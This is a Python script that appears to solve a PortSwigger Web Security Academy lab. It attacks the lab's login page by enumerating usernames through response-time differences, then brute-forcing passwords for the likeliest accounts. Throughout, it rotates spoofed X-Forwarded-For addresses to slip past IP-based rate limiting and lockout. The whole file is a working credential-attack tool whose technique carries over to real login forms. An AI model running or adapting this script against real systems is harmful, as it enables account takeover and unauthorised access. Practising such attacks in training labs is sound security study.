import requests
import time

url = "https://0aa197658318de550009007f.web-security-academy.net/login"

with open('/ PortSwigger/username.txt', 'r') as file:                       
    usernames = [line.strip() for line in file]

# Load passwords
with open('/ PortSwigger/password.txt', 'r') as file:                       
    passwords = [line.strip() for line in file]

 
analysis_responses = {}

for i, username in enumerate(usernames):
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": url,
        "Referer": url,
        "X-Forwarded-For": f"192.168.0.{i+1}",
    }

    data = {
        "username": username,
        "password":'password123'
    }

    resp = requests.post(url, headers=headers, data=data)
    delta = resp.elapsed.total_seconds()
    analysis_responses[username] = delta

    print(f"[{i+1}] | U: {username} -> {resp.status_code}     | T: {delta:.4f}s")


sorted_users = sorted(analysis_responses.items(), key=lambda get_value: get_value[1], reverse=True)

print("\n[*] Top Suspicious Usernames:")
for user, delay in sorted_users[:10]:
    print(f"{user} => {delay}")

found_flag = False

for user, delay in sorted_users[:9]: 
    print(f"[+] Trying user: {user}")

    for j, passwd in enumerate(passwords):
        headers["X-Forwarded-For"] = f"10.0.0.{j+1}"

        data_pass = {
            "username": user,
            "password": passwd
        }

        resp = requests.post(url, headers=headers, data=data_pass )

     
        if 'Invalid username or password.' in resp.text:
            print(f"[-] Wrong -> {user}:{passwd} | {resp.status_code}")


        else:
            print(f"\n✅ VALID CREDENTIALS FOUND:\nUsername: {user}\nPassword: {passwd}")
            found_flag = True
            break
            
    if found_flag:
        break

if not found_flag:
    print("\n[-] No valid credentials found.")
